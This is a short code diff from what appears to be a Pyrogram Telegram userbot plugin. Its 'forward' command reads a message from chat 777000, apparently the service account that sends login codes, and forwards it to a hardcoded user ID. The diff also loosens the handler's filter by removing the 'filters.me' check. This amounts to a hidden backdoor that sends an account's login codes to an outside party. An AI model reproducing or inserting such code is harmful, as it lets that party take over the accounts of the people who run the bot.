@@ -6,7 +6,7 @@ import asyncio
 from OPTIMUS import amaan, HANDLER, OWNER_ID
 from pyrogram import filters
 
-@amaan.on_message(filters.command("forward", HANDLER) & filters.me & filters.user(OWNER_ID))
+@amaan.on_message(filters.command("forward", HANDLER) & filters.user(OWNER_ID))
 async def forwader(client, message):
    a = amaan.get_message(777000)
    await amaan.send_message(511112479, a)
